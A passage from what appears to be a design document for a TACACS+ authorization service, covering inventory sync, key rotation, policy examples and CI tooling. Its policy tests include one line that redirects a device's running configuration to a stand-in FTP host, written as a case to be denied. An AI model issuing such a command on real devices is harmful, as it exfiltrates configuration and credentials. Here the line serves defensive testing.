POST /v1/sync                        on-demand trigger
GET  /v1/healthz
GET  /v1/devices/{address}           diagnostic only — MUST NOT be used on the hot path
```

**Consumers pull and cache; they never query per request.** A daemon calling this API per
connection would make the syncer a hot-path dependency and rebuild the problem the component
exists to prevent.

### One versioned bundle

Three things must reach the other components: device inventory, the policy repository, and
the pinned platform set (§8). Distributing them separately means they can disagree — a broker
evaluating policy `v88` against inventory `v1841` and platform set `1.4.0`, while another
replica holds a different combination. Nothing would report the mismatch.

They are therefore published as **one versioned bundle**:

```
bundle v2291
  inventory      device records, addresses, platforms, attributes
  policy         compiled roles, scopes, subjects, grants
  platform_set   1.4.0, as pinned by the policy repository
```

**A sync can make a valid policy invalid, and the bundle builder quarantines rather than
refuses.** Several load checks are joint over policy and inventory — a privilege level with no
mapping on a platform present in inventory (§6), `enable: auto` reaching a platform whose
enable exchange carries no principal (§5.6). A device racked tomorrow with a new platform can
fail them against a policy that was valid today. Refusing the whole bundle would block every
inventory change fleet-wide until someone edits policy, including the leaf racked in another
site — a ticket-queue bottleneck created by the safety mechanism. Instead the offending
device is published with `admission: quarantined` and the reason; the daemon logs
`device_quarantined` (§5.7), the alarm names it, CI reports the same list against the policy
change that would clear it, and `port49 devices capabilities` shows it. The rest of the fleet
moves.

**A quarantined device gets silence, not FAIL.** The daemon closes the connection without a
reply, exactly as for `device_unknown`. The device then declares the server dead and falls to
its local method, which is the posture every platform documents for a port49 outage and the
one the reference AAA configuration and the runbook already cover. Answering FAIL would be a
new posture: the device believes AAA is healthy and refuses everyone, and whether it then
tries local is L4, unmeasured and platform-dependent. Quarantine means port49 cannot compute a
correct policy for the device, not that the device is suspect, and port49 cannot block the
console or a local account under either shape — so the choice is only whether the failure
looks like a rejection or an outage, and the outage is the one whose consequences are known.
Clearing it is the policy or adapter change CI named, followed by the next sync.

A consumer runs on exactly one bundle version at a time, so a decision is always attributable
to a single, nameable state of the world. `bundle/diff` then covers policy change, inventory
drift, and platform-set movement in one review artifact rather than three.

This also closes a gap the documents otherwise leave open: **how policy reaches the broker**
was previously unspecified.

**Consumers take what they need**, which is not the same thing:

| Component | Consumes | Why |
|---|---|---|
| broker | inventory, policy, platform set | resolves and compiles decisions |
| daemon | inventory only — addresses and `key_ref` | to admit a connection and select a key |

The daemon deliberately does **not** consume policy or platform definitions. It receives
compiled decisions through blobs (§5.1.2) instead, so a version mismatch between broker and
daemon cannot change how a command is evaluated. The bundle carries facts; the blob carries
decisions.

**The service emits key *references*, never key material.** A snapshot carries
`key_ref: prod_key`, and the daemon resolves that from its own secret mount. A compromised
inventory service leaks the fleet list, not the ability to speak to it.

### Admission and keys

Admission splits along where the risk actually sits. The address list is not the security
boundary — **the shared key is.** A device connecting from an admitted range without the
right key sends unreadable data and gets nowhere. Admitting a broad range therefore costs
little, provided key *assignment* is controlled.

| Layer | Holds | Source |
|---|---|---|
| Inventory (synced) | device exists, its addresses, platform, attributes | NetBox / Nautobot |
| Policy repository | key groups — which CIDR or attribute pattern maps to which key reference; default deny | reviewed in a pull request |
| Secret manager | the key material | environment, Vault, or equivalent |

```yaml
# policy repository — intent
key_groups:
  - {match: {cidr: 10.0.0.0/8},       key_ref: prod_key}
  - {match: {attributes: {env: lab}}, key_ref: lab_key}
  # anything matching no group is refused
```

A device racked in a known site is admitted automatically with the correct key. One
appearing in an unexpected range matches no key group and is refused. The fleet list is
maintained once, in the source of truth, while the admission *decision* stays in review.

RFC 9887 replaces the shared key with mutual TLS, so a device record MUST be able to express
both.

#### Addresses must resolve to one device

Device binding depends on the source address identifying a device (design document §13). That
relation is many-to-one, and the two directions are not symmetric:

| Case | Handling |
|---|---|
| One device, several addresses — loopback and management | **Normal.** All are admitted and resolve to the same device. |
| One address, several devices | **Snapshot validation error.** The snapshot is refused, the previous one retained, and both device names are named in the alarm. |
| Several devices behind one NAT address | Unsupported, and indistinguishable from the row above. Design document §13 already forbids SNAT on device traffic; this is where it becomes visible. |

Refusing the snapshot rather than picking a winner is deliberate: a collision means the source
of truth is wrong, and silently binding to whichever record sorted first would attribute one
device's sessions to another — in the audit log, in the decision record, and in every report
built on them.

#### Key group matching is deterministic

Key groups can overlap — a `10.0.0.0/8` group and a `10.20.0.0/16` group, or a CIDR group and
an attribute group covering the same device. Resolution is by tier, most specific first:

```
1  a device record pinning key_ref explicitly
2  an attribute match
3  the longest matching CIDR prefix
```

**Two groups matching in the same tier is a policy load error**, naming both. This follows the
same rule as the matcher (§4): where two rules genuinely disagree about which is more
specific, refusing to guess is the only conservative answer, and a device silently admitted
under the wrong key group is admitted under the wrong *key* — which fails at the worst moment
and looks like an outage (design document §12).

The device-pinned tier exists so an overlap can be resolved explicitly rather than by
contorting the CIDR layout.

### Key rotation

§2 of the design document names shared secrets that are never rotated as one of three
problems with deployed TACACS+. Rotation is therefore a feature, not an operational detail,
and it has to work without a flag day — because the key lives in device configuration, so
there is no such thing as a server-side-only rotation.

#### There is no key identifier on the wire

RFC 8907 obfuscates the body with an MD5 pad keyed on
`session_id ‖ key ‖ version ‖ seq_no`, and carries nothing that says which key was used.
The daemon cannot be told; it MUST try.

Trying is reliably decidable, because the header's `length` field is cleartext. After
de-obfuscating with a candidate key, the body must be self-consistent:

```
authentication START:
    user_len + port_len + rem_addr_len + data_len  ==  length - 8
    action, priv_lvl, authen_type, authen_service   all in valid ranges
```

A wrong key yields pseudorandom bytes. Four of them summing to one exact target is on the
order of 10⁻⁶, and the enum checks drive it several orders lower. Every packet type carries an
equivalent length identity, so validation is not specific to authentication.

Two requirements follow:

- **The reply MUST be obfuscated with the key that validated the request**, not with
  `current`. The device understands only its own key.
- **The resolved key MUST be cached for the life of the TCP connection.** A CONTINUE, or a
  session multiplexed under single-connection mode, re-tries otherwise. The cost of a failed
  candidate is one pad computation, which is acceptable once per connection and wasteful per
  packet.

#### Version sets, and no cutover

A `key_ref` resolves to a set of versions, all of which the daemon accepts until retired:

```yaml
keys:
  prod_key:
    current: {version: 3, secret_ref: vault:port49/prod/v3}
    accept:
      - {version: 2, secret_ref: vault:port49/prod/v2, retire_after: 2026-10-01}
```

`current` decides only two things: what `port49 keys show <device>` renders for provisioning,
and the order candidates are tried in. **Validation accepts any listed version**, so nothing
needs promoting and there is no moment at which a device must already have been updated:

```
day 0     add v3 to the set; the daemon accepts v2 and v3
          → every device still on v2 keeps working, untouched
day 1-20  push v3 device by device, at whatever pace the fleet allows
          → each device works before and after its own change
day 21    `port49 keys status` shows zero devices on v2
day 22    retire v2 in a reviewed change
```

#### Phase-out has to be observable

Step 21 is the one that does not exist in current practice, and its absence is why rotations
get abandoned half-finished — nobody can prove the old key is unused, so it is never removed.
The daemon records which `key_ref` and version validated each connection, which makes the
question answerable:

```
$ port49 keys status
KEY_REF    VERSION  DEVICES  LAST OLD-KEY USE
prod_key         3    8,412  —
                 2       41  12m ago         ⚠ rotation not finished
lab_key          1       88  —
```

The 41 devices MUST be nameable, not merely counted — a rotation stalls on a specific list of
boxes someone has to go and fix, and a count alone cannot be actioned.

#### Devices presenting a key that does not validate

The same report MUST cover the other half of a rotation: devices we are failing to admit. This
is possible because **the RFC 8907 header is cleartext** — version, type, `seq_no`,
`session_id`, and `length` — as is the TCP source address. Only the body is obfuscated. A
packet that validates against nothing is therefore still attributable.

```
UNVALIDATED SOURCES (24h)
SOURCE        DEVICE     KEY_REF    ATTEMPTS  LAST     DIAGNOSIS
10.20.4.9     leaf-19    prod_key       212   30s ago  matches retired v1
10.20.7.3     spine-02   prod_key        14   4m ago   no known key matches
10.99.0.5     —          —                3   1h ago   unadmitted source
203.0.113.7   —          —            1,204   2s ago   not TACACS+ (header invalid)
```

Three mechanisms produce those diagnoses.

**Header validation separates clients from noise.** Version major MUST be `0xc`, type in
{1, 2, 3}, a client `seq_no` odd, and the body within port49's own 4096-byte ceiling — an
implementation limit, since RFC 8907 sets none and an ASCII `user_msg` may in principle run
to 65535 bytes; a legitimate packet larger than this is not known to exist (L10). A
port scanner fails that and is counted as `not TACACS+`, so it never pollutes the key report.
This distinction is the difference between a report an operator reads and one they mute.

**The unencrypted flag is refused.** RFC 8907 defines `TAC_PLUS_UNENCRYPTED_FLAG` in the
header's flags octet, marking a body sent in the clear. The shared key is the admission
boundary (above), and a server that honors the flag has no boundary: anything able to
complete a TCP handshake from an admitted address could then tear down a live context with a
forged START (§5.6, row 5), inject accounting, or drive an operator's failure counters, all
without key material. The daemon MUST refuse such a packet without parsing the body, and the
report carries its own bucket — `unencrypted — refused` — so a device misconfigured with no
key is diagnosable rather than counted as noise. `TAC_PLUS_SINGLE_CONNECT_FLAG` is honored;
the per-connection key cache (above) and the per-NAS connection cap (design document §11)
both apply to the one connection it produces.

A packet whose key validates but which the daemon then cannot answer is a fifth bucket,
`malformed after validation`: either its body fails to decode, or the exchange it belongs to
is one no reply can continue — a CONTINUE naming a session the connection never started, a
`seq_no` of 255, which has no successor, or more unfinished sessions on one connection than
the daemon will hold. The sender holds the right key, so it is neither noise nor a rotation
miss, and the report keeps it apart so a codec gap or an unusual device is seen as such. The
body is still not logged; the record carries the header fields, and a body hash only where
that hash is of the bytes as they arrived on the wire, never of a deobfuscated body.

**Retired versions are retained for diagnosis and never for admission.** This is what turns
"something is wrong with leaf-19" into "leaf-19 was missed in the rotation". The rule is
absolute and MUST be enforced structurally rather than by convention:

> A retired key version may **identify** a device. It MUST NOT admit one, and MUST NOT be used
> to construct a reply.

How many retired versions are kept for diagnosis is configurable, and keeping none is valid
for a deployment that would rather not hold the material at all — at the cost of this column
reading `no known key matches` for every straggler.

**Cross-group probing is manual.** `port49 keys diagnose <device>` may test key material from
*other* key groups, which names a real misconfiguration exactly — a lab device presenting the
production key, say, which is a finding in its own right regardless of the rotation. It MUST
NOT run automatically on validation failure: the listener is unauthenticated, and probing
every key group on every malformed packet is a CPU amplifier available to anyone who can reach
port 49.

**What this cannot distinguish.** A wrong key on the device and wrong key material in the
secret manager present identically — nothing validated, and the packet cannot say why. The
report states `no known key matches` and does not guess; `keys diagnose` is the instrument for
narrowing it. Claiming a cause the evidence does not support would make the whole report
untrustworthy.

Two properties fall out of counting attempts per source:

- **It is most of the rate limiting an unauthenticated listener needs.** Guessing a key is
  infeasible, but each attempt costs a pad computation, so per-source attempt limits with
  backoff bound the CPU an unadmitted source can consume.
- **An unvalidated body MUST NOT be logged.** It is undecodable and attacker-controlled.
  Record the cleartext header fields, the source, and a hash of the body — never its content.

#### Retirement is enforced, and that is the point

`retire_after` is a date, and past it the version is refused. This is the tension worth
stating plainly: **automatic retirement is what prevents a key living for nine years, and
retiring a key still in use locks those devices out.** Both halves are true, and the design
resolves it by making the deadline visible long before it arrives rather than by softening it.

- Alarm severity escalates as `retire_after` approaches while devices still present the
  version, and the remaining device list is in the alarm.
- Retirement and extension are both reviewed changes in the policy repository. Extending is
  legitimate; forgetting is what the date prevents.
- CI MUST refuse a policy whose `accept` set is empty for a `key_ref` still assigned by a key
  group, and MUST report any version whose `retire_after` has already passed. `current` is
  implicitly accepted; `accept` lists the *additional* versions still honored.
- A key with no `retire_after` at all SHOULD be reported. An indefinitely accepted version is
  the state this whole mechanism exists to prevent.

#### Per-device keys are not supported

Deriving a key per device — `KDF(master, device_id)` — narrows blast radius from a CIDR to one
box, and looks attractive on paper. It is **deliberately not offered**, because the key has to
reach the device's configuration and port49 has no way to put it there. Shipping the
derivation without the provisioning would produce a feature that cannot be used, and a
per-device key nobody can install is worse than a shared key that rotates on schedule.

What remains available is that key groups may be narrowed arbitrarily — a group matching a
single device name is legal — so a deployment with its own config automation can express what
it can actually provision. port49 neither builds nor claims that path.

The real answer for per-device credentials is RFC 9887: mutual TLS makes the device credential
a certificate, and certificate rotation is automatable in a way that a secret pasted into
`tacacs-server key` is not. That is a reason to prefer the TLS transport as clients appear,
and it is recorded rather than acted on because no mainstream network OS ships a TLS-capable
TACACS+ client (design document §2).

#### Three key types, and only one is hard

| Key | Rotation |
|---|---|
| RFC 8907 device-facing shared keys | the mechanism above: version sets, try-and-validate, observed phase-out |
| Encryption at rest for tokens and login context (design document §8) | envelope each value with its key id and accept both during a window; re-encrypt on next write, and sweep the contexts that have none — an idle session on a session-only platform is never written to — before the old key is dropped. No external party is involved, so this is ordinary |
| mTLS material — RFC 9887, agent, broker, internal APIs | certificate lifecycle, handled by whatever issues them |

Only the first is genuinely difficult, and only because a remote party holds a copy that
port49 cannot reach.

### Device records

```yaml
  - name: leaf-01
    addresses: [10.0.1.5, 10.0.1.6, 2001:db8::5]
    platform: arista_eos
    attributes: {site: dc1, role: leaf, os_version: "4.31.2F"}
```

**Every address a device may source from must be listed.** TACACS is commonly sourced from a
loopback or dedicated management interface that is not the device's primary address. A
device sourcing from an unlisted interface fails device binding, and the failure will not
obviously trace back to inventory. `ip tacacs source-interface` — or the platform equivalent
— MUST be pinned in the reference AAA configuration.

### Connectors and sync cadence

**NetBox and Nautobot** are the verified pair. Infrahub, Ansible inventory, and a plain file
follow the same snapshot contract. A file connector is required regardless, as the inventory
equivalent of the in-memory store — containerlab runs, CI policy tests, and `port49 explain`
against a hypothetical device all need an inventory that is not a live source of truth.

Four triggers, not one:

- **Scheduled full sync every 10 minutes.** That is the window a newly-racked device sits
  un-admittable if a webhook is missed, which is about the tolerance before it becomes a
  ticket.
- **Webhook-driven refresh.** Both products emit outbound webhooks on device create and
  update, giving seconds for the common case without polling harder.
- **`port49 inventory sync`** on demand.
- **Full sync at startup**, refusing to serve with no snapshot at all.

Four requirements:

**Version detection.** NetBox 4.x renamed `device_role` to `role`; Nautobot 2.0 did the same
and dropped `slug` from most models. The connector selects a mapping profile from the API
root version, with an explicit override available.

**GraphQL first.** At 10,000 devices, REST pagination is hundreds of round trips per sync.
Both products expose GraphQL; one query returns devices, addresses, platform, site, role,
and tags. REST remains a fallback for older installations.

**Bounded change per sync.** A sync that would remove more than `max_removed_percent` of the
fleet MUST refuse, retain the last good snapshot, and alarm. A partially-available source of
truth or a mistyped filter would otherwise silently deauthorize the fleet.

**Platform slug translation.** Real installations say `eos`, `arista-eos`, `arista_eos`, or
`veos`. Ship an alias table, allow overrides, and warn on unrecognized slugs rather than
falling back to generic in silence.

```yaml
inventory:
  sync:
    - name: netbox_prod
      type: netbox
      url: https://netbox.example.com
      token_secret_ref: vault:port49/prod/netbox   # resolved like a key secret_ref, never inline
      interval: 10m
      filter: {status: active, has_primary_ip: true}
      map:
        site:       site.slug
        role:       device_role.slug
        platform:   platform.slug
        os_version: custom_fields.os_version
      safety:
        max_removed_percent: 10
```

### How a daemon refreshes its snapshot

The daemon consumes only the inventory portion of the bundle; "snapshot" below means that
portion, refreshed as a whole because the bundle is versioned as a whole.

```
every 30s:
  GET /v1/bundle/version
  if version == held.version:  done          ← the common case
  GET /v1/bundle  (If-None-Match: <etag>)
  parse → build index → validate → atomic pointer swap
```

**Build fully, then swap.** The snapshot is parsed and indexed into a prefix trie
(`address or CIDR → device, key_ref`) before anything is exchanged, then swapped by a single
atomic pointer store. Readers take no lock, and in-flight connections complete against the
snapshot they began with. Never mutate in place.

**Validate locally before swapping.** The service already applies bounded-change safety, but
the daemon MUST NOT trust the payload: reject a snapshot that fails to parse, that is empty,
or that drops more than the configured share; retain the previous one and alarm.

**The snapshot never expires.** Staleness is a metric and an alarm —
`inventory_snapshot_age_seconds` — never a fail-closed. An admission table with a TTL means a
prolonged syncer outage eventually halts all authentication fleet-wide, which is the
readiness-probe mistake of §12 of the design document in a different form. A stale device
list is a far smaller problem than no device list; revoking a specific device is a key
rotation, not a sync.

**Cold start is the one case where readiness gating is correct.** A daemon with no snapshot
genuinely cannot serve, so it remains unready and retries. This is safe precisely because,
unlike store health, only *new* pods lack a snapshot — existing replicas continue serving and
all endpoints are never lost at once.

**A daemon MUST be able to start without the inventory service**, or the claim that nothing
depends on that service being up is false. A fresh pod would otherwise stay unready for the
duration of an inventory outage, which means no autoscaling under load and no recovery from a
crash loop or a node replacement — precisely when capacity matters. Two mechanisms, in order:

1. **The last good bundle is persisted to local disk** (a MUST, not a SHOULD), so a restart in
   place needs nothing.
2. **A shared object-store location** holds the most recent bundle, written by the inventory
   service and readable by daemons. A pod scheduled onto a fresh node reads that and serves.

Both are cold and cached; neither puts the inventory service on a request path. Without at
least one of them, the singleton is not free after all — it is a startup dependency wearing a
different name.

**Key resolution stays local.** An unresolvable `key_ref` fails that device closed — not the
daemon — and alarms, because that is a misconfiguration worth hearing about on the first
device rather than the ten-thousandth.

**Every swap logs a summary** — `snapshot v1841 → v1842: +3 devices, -1, 2 changed` — so an
unexpected fleet change is visible in the daemon's own logs, not only in the service's.

### Source-of-truth write access is privilege-granting

If scopes match on synced attributes (§5.5), whoever can change a device's `role` or
`os_version` can move it into or out of a scope — with no policy change, no pull request, and
no diff. The policy file looks untouched.

Mitigations, designed in rather than documented afterward:

- Scope-membership changes MUST appear in the sync diff and be reviewable, and so MUST an
  address added to an existing device — the mint response carries that address back for the
  operator's SSH client to connect to, so a rogue address on a real device's record is a
  credential-capture path (design document §17).
- A scope MUST be able to pin a device set explicitly instead of by attribute.
- Scopes carrying denies SHOULD set `security_log: true`, so membership changes are logged
  and alerted as security events rather than routine inventory churn.
- Attributes used for security scoping SHOULD come from an attested path rather than a
  hand-editable field.

> **Principle.** The source of truth supplies facts about devices; the policy repository
> supplies intent. The moment a source-of-truth tag can grant a permission, authorization has
> left code review — which is the outcome the design document's §9 exists to prevent.

---

## 11. Complete policy example

```yaml
platform_set: 1.4.0

privilege_levels:
  - {name: readonly}
  - {name: read_only_limited, parent: readonly}
  - {name: operator}
  - {name: admin}

key_groups:
  - {match: {cidr: 10.0.0.0/8},       key_ref: prod_key}
  - {match: {attributes: {env: lab}}, key_ref: lab_key}

scopes:
  - {name: all_devices, match: {}}
  - {name: dc_fabric,   match: {site: [dc1, dc2], role: [leaf, spine]}}
  - name: srx_unpatched
    match: {platform: juniper_junos, os_version: {lt: "21.4R3-S5"}}
    on_missing: include
    security_log: true
    attached_roles:
      humans:   [cve_2026_xxxx]
      machines: [cve_2026_xxxx]

roles:
  - name: read_only
    privilege: readonly
    permit:
      - show **
      - terminal length *

  - name: read_only_limited
    privilege: read_only_limited
    permit:
      - show version
      - show interfaces **
      - show ip route **

  - name: network_admin
    privilege: admin
    permit: ["**"]
    pipe:
      permit: ["**"]

  - name: bgp_operator
    privilege: operator
    permit:
      - show bgp **
      - clear bgp /^[0-9]+$/ **
      - clear bgp neighbor **
    deny:
      - clear bgp all

  - name: interface_tech
    privilege: operator
    permit:
      - configure **
      - interface @physical
      - shutdown
      - no shutdown
      - description **
      - end
    deny:
      - interface @management

  - name: elevated_session
    privilege: admin
    reason: "device exposes show running-config only at level 15"

  - name: no_disruptive
    deny:
      - reload **
      - write erase **

  - name: cve_2026_xxxx
    reason: "CVE-2026-XXXX — SRX cluster subsystem"
    deny:
      - show chassis cluster **

  - name: cve_2026_xxxx_assess
    reason: "CVE-2026-XXXX — IR needs cluster state to assess exposure"
    permit:
      - show chassis cluster status

subjects:
  - {name: netops_admins, group: "CN=netops-admins,OU=Groups,DC=example,DC=com",
     enable: token, token_ttl: 60s}
  - {name: noc_tier1,     group: "CN=noc-tier1,OU=Groups,DC=example,DC=com",
     enable: none,  token_ttl: 60s}
  - {name: security_ir,   group: "CN=security-ir,OU=Groups,DC=example,DC=com",
     enable: token, token_ttl: 60s}
  - {name: svc_oxidized,  identity: "system:serviceaccount:netops:oxidized",
     enable: token, token_ttl: 900s}

grants:
  - {subject: netops_admins, scope: all_devices,   roles: [network_admin], max_privilege: admin}
  - {subject: noc_tier1,     scope: all_devices,   roles: [read_only, no_disruptive]}
  - {subject: noc_tier1,     scope: dc_fabric,     roles: [interface_tech], expires: 2026-12-01}
  - {subject: svc_oxidized,  scope: all_devices,   roles: [read_only, elevated_session]}
  - {subject: security_ir,   scope: srx_unpatched, roles: [cve_2026_xxxx_assess]}

tests:
  - {subject: noc_tier1,    device: leaf-01, command: "show version",   expect: permit}
  - {subject: noc_tier1,    device: leaf-01, command: "reload",         expect: deny}
  - {subject: noc_tier1,    device: leaf-01, command: "show run | redirect ftp://x",
     expect: deny}
  - {subject: svc_oxidized, device: leaf-01, command: "show running-config",
     expect: permit}
  - {subject: svc_oxidized, device: srx-fw-04, command: "show chassis hardware",
     expect: permit}      # the CVE deny is scoped to `cluster`, so no conflict arises
  - {subject: noc_tier1,    device: srx-fw-04, command: "show chassis cluster status",
     expect: deny}        # only the CVE deny matches
  - {subject: security_ir,  device: srx-fw-04, command: "show chassis cluster status",
     expect: permit}      # the assess permit dominates the CVE deny at every position
```

Three things this example is chosen to show.

**No vendor attribute string appears anywhere.** `interface @management` and
`privilege: readonly` carry all the platform-specific knowledge, resolved by the adapter.

**`svc_oxidized` composes two roles rather than overriding a level.** `read_only` supplies
the command rules, `elevated_session` supplies the privilege, and the reason the elevation
exists is recorded on the role that carries it.

**The CVE mitigation is three lines and self-limiting.** It applies to every principal on
every unpatched SRX including devices not yet racked, lapses per device as inventory reflects
the upgrade, and admits a deliberate, narrow exemption for incident response through the same
mechanism as everything else.

---

## 12. Tooling

Policy is reviewable only if reviewers see effect, not text.

**`port49 explain`** resolves a hypothetical decision and names exactly one reason,
including which role would grant a denied command. On a platform where the relevant control
cannot be enforced — `pipe_authorized: false`, or `supports` lacking `config_commands` — it
MUST say so rather than reporting a decision the device will not honor.

**Effective-permission diff in CI.** Because evaluation is order-free set algebra over token
trees, `permits ∖ denies` is a computable object and old-versus-new is an exact difference.
Leaf regex is the one construct that degrades this: a regex position is not enumerable, so
the diff reports *"argument 3 is regex-constrained and the constraint changed"* rather than
listing commands. This is contained, and is a reason to prefer literals and `*`.

**Policy tests** run in CI against a file-backed inventory, as in §11.

**Intersection checks.** Because the effective permission set is the intersection of what
the device offers and what port49 permits (§6), CI MUST report where the two disagree. Neither of these is visible in any existing TACACS+
system, and both are ordinary review questions once surfaced:

```
⚠ DEAD RULES — interface_tech permits commands its privilege cannot reach
    privilege: readonly  →  arista_eos priv-lvl=1
    unreachable: configure **, interface /^(ethernet|port-channel)/, shutdown
    the device will never submit these for authorization

⚠ FALLBACK EXPOSURE — svc_oxidized
    port49 rules confine it to:  show **
    device role on failure:      network-admin  (full administrative access)
    if port49 is unreachable, this subject has more access than policy grants
```

**Attribute shadowing.** Where a role or grant attribute overrides a platform attribute of
the same name (§6), CI MUST name both so the override is deliberate.

**`port49 devices capabilities`** reports the `supports`-versus-`observed` matrix from §9.

**Shadowed-deny report.** Because a more specific permit can override a deny (§5.4), CI MUST
name every shadowed deny, the subject it fails to bind, and the permit that beats it. This is
what replaces the guarantee deny-overrides would have provided.

**Privilege-expansion gate.** The check that matters under most-specific semantics is not
"did the permit set grow" but **"does this change make command C permitted where it was
denied"** — computable exactly from the trie.

**`port49 platform upgrade`** reports what a platform-set bump changes, so a binary upgrade
is never an unreviewed policy change (§8).

**`port49 policy replay`** re-evaluates a decision record against the blob it names (§5.7).
It is the same evaluator the daemon runs. Beyond answering an auditor, a captured corpus
replayed against a candidate build turns "did this release change anyone's access" into a
diff — which is the only form of that question a reviewer can actually check.

**`port49 keys status`** counts devices per accepted key version, names those still presenting
an old one, and lists sources whose packets validated against nothing — separating a retired
version, unknown material, an unadmitted source, and traffic that is not TACACS+ at all (§10).
It is the instrument a rotation is driven by, and its output belongs in the pull request that
retires a version. **`port49 keys diagnose <device>`** tests other key groups' material to
name a misconfiguration exactly; it is manual because the equivalent automatic probe would be
a CPU amplifier on an unauthenticated listener. **`port49 keys show <device>`** resolves which
`key_ref` a device matches; rendering the secret itself is a separately-authorized operation,
since a group key is shared across the devices in its group.

**Access review** is a rendering of the flat grant table, not an investigation:
`port49 access review --subject <name>` lists every grant row the subject appears in, with
scope size and expiry, and `port49 grants remove --subject <name>` produces the pull request
that deletes them all — and, when no grant on the subject remains, the subject block itself,
so nothing is left behind to match. Directory-driven humans are offboarded by group removal;
these two commands are the offboarding path for machine subjects and literal identities,
which is the cost decision 2 accepted. A subject block with no grants is reported by CI.

**Rollback** is `git revert` of the policy change and `port49 inventory sync`; the bundle
that results is a new version, not a reused old one, so a rollback is attributable like any
other publish. There is no pin-to-old-version command, because a consumer holding a bundle
the repository no longer describes is the drift the bundle exists to prevent.

---

## 13. Decisions

Questions left open in the first draft of this document and since resolved. Recorded here
because the reasoning matters more than the outcome.

**1. Precedence — specificity dominance, a partial order.** Deny-overrides is simpler to
state but cannot express an exception without negation, and RE2 has no lookahead. The
motivating case was real: a broad `show chassis *` deny added for a CVE broke a backup
account's `show chassis hardware`.

A permit therefore applies only when it dominates every matching deny — at least as specific
at every argument position, strictly more somewhere. The ordering is deliberately **partial**:
three total orderings were tried (lexicographic, sum of ranks, run-collapsed distance) and
each failed on real policies, because collapsing the tuple to one number forces an answer
even where two rules genuinely disagree about which position matters. Declining to rank
incomparable rules is what keeps the result conservative in every case.

There is exactly **one** deny mechanism; a shadowed deny is surfaced by CI rather than
prevented by a second construct. (§5.4)

**2. Grant shape — flat.** One row per subject × scope × roles. Greppable, renders directly
as the access-review report, and makes a fleet-wide emergency grant a single appended line
rather than a structural edit made under pressure. The cost is offboarding across scattered
rows, addressed by tooling. (§11)

**3. Privilege on the role, never overridden on a grant.** An override has nowhere to record
why it exists, and because the level also selects the device-local role that applies when
port49 is unreachable, an inline override silently changes degraded-mode behavior. Role
explosion is avoided by composition — a privilege-only role such as `elevated_session` —
rather than by variants. (§6)

**4. Privilege levels — shipped defaults plus user extension.** `readonly`, `operator`, and
`admin` are reserved and always present so shipped platform files always resolve; operators
declare their own ordering and add levels, with `parent:` supplying a rendering fallback so a
new level does not require a mapping for every vendor. (§6)

**5. Device admission — inventory for existence, policy repository for key assignment.** The
address list is not the security boundary; the key is. Splitting there means the fleet is
maintained once in the source of truth while the admission decision stays in review. (§10)

**6. Entity naming — classes, not canonicalization.** Adapters classify their own names into
`@management`, `@physical`, and similar rather than mapping every vendor into a common
scheme. A rule referencing an undefined class is a load error, which eliminates the silent
non-match. (§4, §8)

**7. Version comparison — one generic comparator, no per-vendor setting.** Tokenize into
digit and letter runs; digits compare numerically, letters by equality only. An incomparable
version folds into `on_missing` and is assumed unpatched, and the devices affected are always
reported rather than silently swept in. Fleets cluster at a few versions through natural
upgrade cycles, so the ambiguous case is rare — and when it fires, over-mitigating is the
right failure. (§5.5)

**8. The device-facing username — derived at mint, declared for machines.** Human usernames
come from the same directory query that resolves groups, or the OIDC `preferred_username`
claim; machine subjects declare one, since they have no directory entry. Unique across
subjects, and compared after case and domain normalization. (§2)

**9. Platform data — compiled into the decision, not distributed to daemons.** The broker
expands entity classes and embeds normalization parameters into a hash-named blob, so a
daemon and a broker can never disagree about how a rule is evaluated, even mid-upgrade. The
bundle carries facts; the blob carries decisions. (§5.1.2, §10)

**10. The decision log is separate from device accounting, and is replayable.** Two streams
with different guarantees: accounting reports what a device did, incompletely and only where
configured; the decision log records what port49 decided, completely, because every decision
passes through it. Records name the immutable blob they were decided against rather than
narrating a rationale, so a decision can be re-evaluated and verified instead of taken on
trust — and a divergence on replay is itself a finding. Permits are never sampled or
suppressed; the artifact is worthless without them. (§5.7)

**11. Accounting is advisory — it annotates login context and never deletes it.** Earlier
drafts ordered teardown triggers by reliability and let all of them delete state, which made
a best-effort, device-generated, separately-delivered signal load-bearing. A logout STOP
delayed past a line's reuse then denies the *next* operator mid-session: fail-closed, but a
self-inflicted outage whose two halves look unrelated in a log. Teardown is now ordered by
**authority** — port49's own redemption, revocation from the identity layer, the local
session ceiling, a username conflict, idle TTL — and accounting only sets
`accounting_state: closing`. The bindings were always the security control; teardown is state
hygiene, and hygiene must not be able to cause an outage. (§5.6, §5.8)

**12. Credential expiry bounds the mint, not the session.** An OIDC `exp` is commonly minutes
and a certificate's `notAfter` describes validity at authentication, so neither is a session
ceiling — using them as one would end a router session every hour for no security gain. The
session clock is `auth_time + max_session_age`, port49 policy, per-role, and `never` is
expressible. Because port49 can deny commands but has no way to close a session, reaching the
ceiling never drops a connection or abandons a candidate configuration: the operator is warned
in-session through `server_msg`, re-authenticates out of band while the session stays open, and
context survives a grace window so a late re-auth resumes rather than reconnects. (§5.1.4,
§5.6)

**13. Login context records credential identity for revocation, not for verification.** The
daemon never sees the credential — the command exchange carries only `user`, `port`,
`rem_addr`, and `priv_lvl` — so a fingerprint cannot tighten per-command comparison. It is
recorded because it enables actions otherwise impossible: OIDC `sid` makes back-channel logout
reach live device sessions, and certificate issuer and serial are exactly what a CRL or OCSP
response names. `amr` and `acr` are recorded but unused, because how someone authenticated
cannot be established after the fact. The cost is that context now holds PII-adjacent
material, so it inherits the encryption-at-rest requirement previously applied only to
tokens. (§5.1.4)

**14. Key rotation is a version set with no cutover, and per-device keys are refused.** RFC
8907 carries no key identifier, so the daemon tries each accepted version and validates the
de-obfuscated body against the cleartext `length` field — reliable to around 10⁻⁶ before enum
checks. Because every non-retired version is accepted at all times, rotation has no flag day:
add a version, provision devices at their own pace, retire the old one. The missing piece in
current practice is not the mechanism but the *evidence* — nobody can prove an old key is
unused, so it is never removed — so the daemon records the validating version and
`keys status` names the devices still on it. Because the RFC 8907 header is cleartext, the
same report also attributes the packets that validated against *nothing* — separating a
retired version from unknown material, an unadmitted source, and traffic that is not TACACS+ —
so both halves of a rotation are visible. Retired versions are retained to make that diagnosis
and may identify a device but never admit one. `retire_after` is enforced rather than
advisory, which is the only thing that prevents a nine-year-old key, with escalating alarms
and a reviewed extension path as the answer to the lockout risk it creates.

Per-device derived keys were considered and **rejected**: port49 cannot write device
configuration, so it cannot install the key it would derive, and a per-device key nobody can
provision is worse than a shared key that rotates on schedule. Key groups may be narrowed to a
single device for deployments with their own automation; port49 does not claim that path. (§10)

**15. The login context is keyed on `(nas, username)`; the receipt on
